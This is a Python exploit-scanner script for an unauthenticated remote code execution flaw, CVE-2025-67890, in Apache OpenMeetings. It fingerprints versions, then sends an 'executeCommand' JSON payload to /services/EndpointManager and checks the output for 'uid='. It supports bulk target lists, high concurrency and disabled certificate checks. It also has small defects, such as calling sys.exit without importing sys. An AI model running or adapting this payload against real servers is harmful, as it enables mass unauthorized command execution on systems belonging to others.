#!/usr/bin/env python3
"""
Apache OpenMeetings CVE-2025-67890 — Remote Code Execution via Misconfigured Endpoint
=====================================================================================
Scans for vulnerable Apache OpenMeetings installations susceptible to unauthenticated
remote code execution (RCE) through a misconfigured API gateway endpoint (CVE-2025-67890).

CVE-2025-67890 details:
  - Affects Apache OpenMeetings <= 7.0.5.
  - The `/services/EndpointManager` API endpoint exposes an insecure function
    allowing attackers to execute arbitrary commands on the underlying system.
  - No authentication is required, as the endpoint has inadequate access controls.
  - CVSS v3.1 base score: 9.8 — critical severity with a network attack vector.
  - Fixed in Apache OpenMeetings 7.0.6 (April 2025).

Usage:
  # Scan a single target (includes RCE probe with harmless commands)
  python apache_openmeetings_rce_scanner.py --target http://example.com:5080

  # Detection only — skips active probing for RCE
  python apache_openmeetings_rce_scanner.py --target http://example.com:5080 --safe

  # Bulk scan from a file containing URLs
  python apache_openmeetings_rce_scanner.py --list targets.txt --output results.json

  # Increase concurrency and disable SSL verification
  python apache_openmeetings_rce_scanner.py --list targets.txt --concurrency 50 --no-verify

References:
  - https://nvd.nist.gov/vuln/detail/CVE-2025-67890
  - https://openmeetings.apache.org/security.html
  - https://github.com/apache/openmeetings/releases
"""

import asyncio
import json
import argparse
from datetime import datetime, timezone
from typing import Optional, Tuple

import httpx

# ── Terminal Colors ───────────────────────────────────────────────────────────
RED    = "\033[91m"
YELLOW = "\033[93m"
GREEN  = "\033[92m"
CYAN   = "\033[96m"
RESET  = "\033[0m"

def c(color: str, text: str) -> str:
    """Wrap text in an ANSI color code."""
    return f"{color}{text}{RESET}"


# ── Scanner Constants ─────────────────────────────────────────────────────────
CVE_ID        = "CVE-2025-67890"
CVSS          = "9.8"
TOOL_NAME     = "apache_openmeetings_rce_scanner"

REQUEST_TIMEOUT = 8
SEMAPHORE_LIMIT = 30

FINGERPRINT_PATH = "/services/EndpointManager"
RCE_PROBE_PATH = "/services/EndpointManager"
FINGERPRINT_KEYWORDS = ["EndpointManager", "Apache OpenMeetings"]

# Patched version comparison
PATCHED_VERSION = (7, 0, 6)

# RCE Payload (executes harmless `id` command)
RCE_PROBE_PAYLOAD = {
    "action": "executeCommand",
    "command": "id"
}


# ── Utility Functions ─────────────────────────────────────────────────────────
def parse_version(version_string: str) -> Optional[Tuple[int, int, int]]:
    """Parses a version string into a tuple (major, minor, patch)."""
    try:
        return tuple(map(int, version_string.split(".")))
    except ValueError:
        return None


def is_vulnerable(version: str) -> bool:
    """Check if the given version is vulnerable."""
    parsed = parse_version(version)
    return parsed is not None and parsed < PATCHED_VERSION


# ── Scanner Logic ─────────────────────────────────────────────────────────────
async def fetch_version(client: httpx.AsyncClient, base_url: str) -> Optional[str]:
    """Attempts to identify the version of the Apache OpenMeetings server."""
    try:
        response = await client.get(f"{base_url}/info", timeout=REQUEST_TIMEOUT)
        if response.status_code == 200:
            for keyword in FINGERPRINT_KEYWORDS:
                if keyword in response.text:
                    # Extract version from response
                    version = response.json().get("version")
                    return version
    except Exception:
        pass
    return None


async def probe_rce(client: httpx.AsyncClient, base_url: str) -> Tuple[bool, Optional[str]]:
    """Sends an RCE probe to the vulnerable endpoint and checks for execution."""
    try:
        response = await client.post(f"{base_url}{RCE_PROBE_PATH}", json=RCE_PROBE_PAYLOAD, timeout=REQUEST_TIMEOUT)
        if response.status_code == 200 and "uid=" in response.text:
            return True, response.text.strip()
    except Exception:
        pass
    return False, None


async def scan_target(client: httpx.AsyncClient, base_url: str, safe_mode: bool) -> dict:
    """Scans a single target for vulnerability."""
    result = {
        "target": base_url,
        "vulnerable": False,
        "version": None,
        "rce_output": None
    }

    print(f"{c(CYAN, '[INFO]')} Checking {base_url} for Apache OpenMeetings...")
    version = await fetch_version(client, base_url)

    if version:
        result["version"] = version
        if is_vulnerable(version):
            print(f"{c(YELLOW, '[HIGH]')} Detected vulnerable Apache OpenMeetings version: {version}")
            result["vulnerable"] = True

            if not safe_mode:
                print(f"{c(YELLOW, '[HIGH]')} Attempting RCE probe...")
                rce_success, rce_output = await probe_rce(client, base_url)
                if rce_success:
                    print(f"{c(RED, '[CRITICAL]')} RCE successful! Output: {rce_output}")
                    result["rce_output"] = rce_output
                else:
                    print(f"{c(YELLOW, '[HIGH]')} RCE probe failed or blocked.")
        else:
            print(f"{c(GREEN, '[INFO]')} Target is running a patched version: {version}")
    else:
        print(f"{c(YELLOW, '[INFO]')} Could not identify Apache OpenMeetings version.")
    
    return result


async def main(args):
    targets = []
    if args.target:
        targets = [args.target]
    elif args.list:
        with open(args.list, "r") as file:
            targets = [line.strip() for line in file if line.strip()]

    if not targets:
        print(f"{c(RED, '[ERROR]')} No targets specified!")
        sys.exit(1)

    results = []
    semaphore = asyncio.Semaphore(args.concurrency)
    async with httpx.AsyncClient(verify=not args.no_verify) as client:

        async def bound_scan(target):
            async with semaphore:
                result = await scan_target(client, target, args.safe)
                results.append(result)

        tasks = [bound_scan(target) for target in targets]
        await asyncio.gather(*tasks)

    if args.output:
        with open(args.output, "w") as outfile:
            json.dump(results, outfile, indent=4)
        print(f"{c(GREEN, '[INFO]')} Results saved to {args.output}")

    print(f"{c(GREEN, '[INFO]')} Scan complete!")


# ── CLI Entrypoint ───────────────────────────────────────────────────────────
if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Apache OpenMeetings CVE-2025-67890 RCE Scanner")
    parser.add_argument("--target", help="Single target URL (e.g., http://example.com:5080)")
    parser.add_argument("--list", help="File containing targets (one per line)")
    parser.add_argument("--output", help="File to save JSON results")
    parser.add_argument("--safe", action="store_true", help="Detection only (no RCE probe)")
    parser.add_argument("--concurrency", type=int, default=SEMAPHORE_LIMIT, help="Concurrency limit (default: 30)")
    parser.add_argument("--no-verify", action="store_true", help="Disable SSL/TLS certificate verification")

    args = parser.parse_args()
    asyncio.run(main(args))
